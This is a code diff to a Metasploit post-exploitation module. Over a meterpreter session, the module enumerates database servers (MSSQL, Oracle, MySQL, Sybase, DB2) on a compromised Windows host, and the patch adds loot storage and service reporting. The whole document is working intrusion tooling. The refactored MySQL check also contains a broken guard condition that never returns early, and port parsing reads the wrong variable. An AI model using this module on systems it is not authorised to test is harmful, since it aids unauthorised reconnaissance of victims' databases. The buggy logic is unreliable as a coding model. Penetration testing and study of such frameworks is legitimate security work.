@@ -9,16 +9,16 @@
 #   http://metasploit.com/
 ##
 
-require 'msf/core'
 require 'rex'
-require 'msf/core/post/windows/registry'
+require 'msf/core'
 require 'msf/core/post/file'
 require 'msf/core/post/common'
+require 'msf/core/post/windows/registry'
 
 class Metasploit3 < Msf::Post
 
-	include Msf::Post::Common
 	include Msf::Post::File
+	include Msf::Post::Common
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
 	
@@ -29,7 +29,6 @@ class Metasploit3 < Msf::Post
 				'Description'   => %q{ This module will enumerate a windows system for installed database instances },
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Barry Shteiman <barry[at]sectorix.com>'],
-				'Version'       => '$Revision$',
 				'Platform'      => [ 'windows' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
@@ -136,8 +135,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	##### deep analysis methods #####
-	
-	
+		
 	# method to identify mssql instances
 	def enumerate_mssql
 		key = "HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL"
@@ -147,10 +145,11 @@ class Metasploit3 < Msf::Post
 				tcpkey = "HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\#{registry_getvaldata(key,i)}\\MSSQLServer\\SuperSocketNetLib\\Tcp\\IPAll"
 				tcpport = registry_getvaldata(tcpkey,"TcpPort")
 				print_good("\t\t+ #{registry_getvaldata(key,i)} (Port:#{tcpport})")
-				
+				loot("mssql","instance:#{registry_getvaldata(key,i)} port:#{tcpport}","Microsoft SQL Server",tcpport)
 			end
 		end
 	rescue
+		print_error("\t\t+ could not identify information")
 	end
 	
 	# method to identify oracle instances
@@ -172,59 +171,62 @@ class Metasploit3 < Msf::Post
 							port = $1
 						end
 					end
-					print_good("\t\t+ #{val_ORACLE_SID} (Port:#{port})")				
+					print_good("\t\t+ #{val_ORACLE_SID} (Port:#{port})")
+					loot("oracle","instance:#{val_ORACLE_SID} port:#{port}","Oracle Database Server",port)
 				else
 					print_error("\t\t+ #{val_ORACLE_SID} (No Listener Found)")				
 				end
 			end
 		end
 	rescue
+		print_error("\t\t+ could not identify information")
 	end
 
 	# method to identify mysql instances
 	def enumerate_mysql
 		basekey = "HKLM\\SOFTWARE\\MySQL AB"
 		instances = registry_enumkeys(basekey)
-		if not instances.nil? and not instances.empty?
-			instances.each do |i|
-				found = false
-				key = "#{basekey}\\#{i}"
-				val_Location = registry_getvaldata(key,"Location")
-				if session.fs.file.exists?(val_Location + "\\my.ini")
-					found = true
-					data = read_file(val_Location + "\\my.ini")
-				elsif session.fs.file.exists?(val_Location + "\\my.cnf")
-					found = true
-					data = read_file(val_Location + "\\my.cnf")
-				else
-					sysdriv=session.fs.file.expand_path("%SYSTEMDRIVE%")			
-					getfile = session.fs.file.search(sysdriv + "\\","my.ini",recurse=true,timeout=-1)
-					data = 0
-					getfile.each do |file|
-						if data == 0
-							if session.fs.file.exists?("#{file['path']}\\#{file['name']}")
-								found = true
-								data = read_file("#{file['path']}\\#{file['name']}")
-							end
-						end
+		if  instances.nil? and not instances.empty?
+			return
+		end
+		instances.each do |i|
+			found = false
+			key = "#{basekey}\\#{i}"
+			val_Location = registry_getvaldata(key,"Location")
+			if session.fs.file.exists?(val_Location + "\\my.ini")
+				found = true
+				data = read_file(val_Location + "\\my.ini")
+			elsif session.fs.file.exists?(val_Location + "\\my.cnf")
+				found = true
+				data = read_file(val_Location + "\\my.cnf")
+			else
+				sysdriv=session.fs.file.expand_path("%SYSTEMDRIVE%")			
+				getfile = session.fs.file.search(sysdriv + "\\","my.ini",recurse=true,timeout=-1)
+				data = 0
+				getfile.each do |file|
+					if session.fs.file.exists?("#{file['path']}\\#{file['name']}")
+						found = true
+						data = read_file("#{file['path']}\\#{file['name']}")
+						break
 					end
 				end
-				if found
-					ports = data.scan(/port\=(\d+)/)
-					port = 0
-					ports.each do |p|
-						if port == 0
-							port = $1
-						end
+			end
+			if found
+				ports = data.scan(/port\=(\d+)/)
+				port = 0
+				ports.each do |p|
+					if port == 0
+						port = $1
 					end
-					print_good("\t\t+ MYSQL (Port:#{port})")
-				else
-					print_error("\t\t+ couldnt locate file.")
 				end
-				
+				print_good("\t\t+ MYSQL (Port:#{port})")
+				loot("mysql","instance:MYSQL port:#{port}","MySQL Server",port)
+			else
+				print_error("\t\t+ couldnt locate file.")
 			end
 		end
 	rescue
+		print_error("\t\t+ could not identify information")
 	end
 	
 	# method to identify sybase instances
@@ -249,6 +251,7 @@ class Metasploit3 < Msf::Post
 				end
 			end		
 			print_good("\t\t+ #{instance} (Port:#{port})")
+			loot("sybase","instance:#{instance} port:#{port}","Sybase SQL Server",port)
 		else
 			print_error("\t\t+could not locate configuration file.")
 		end
@@ -285,7 +288,8 @@ class Metasploit3 < Msf::Post
 			end
 		end
 		cmd_i.split("\n").compact.each do |line|
-			print_good("\t\t+ #{line.strip} (Port:#{port_t})")	
+			print_good("\t\t+ #{line.strip} (Port:#{port_t})")
+			loot("db2","instance:#{line.strip} port:#{port_t}","DB2 Server",port_t)
 		end
 	rescue
 		print_error("\t\t+ could not identify instances information")
@@ -306,9 +310,23 @@ class Metasploit3 < Msf::Post
 		process.close
 		return res
 	rescue
+		print_error("\t\t+ could not execute remote process")
+		return ""
 	end
 	
-	
-
+	# this method stores the loot in a consistant format for this module, and reports on service
+	def loot(dbtype,dbdata,dbinfo,dbport)
+		rhost = sysinfo['Computer']
+		filename = "#{rhost}_#{dbtype}_database_enumeration.txt"
+		store_loot("windows.database.#{dbtype}",
+			"text/plain",
+			session,
+			"host:#{rhost} type:#{dbtype} #{dbdata}",
+			filename,
+			dbinfo)
+		report_service(:host => rhost, :port => dbport, :name => dbtype, :info => "#{dbtype}, #{dbdata}")
+	rescue
+		print_error("\t\t+ could not store loot")
+	end
 	
 end
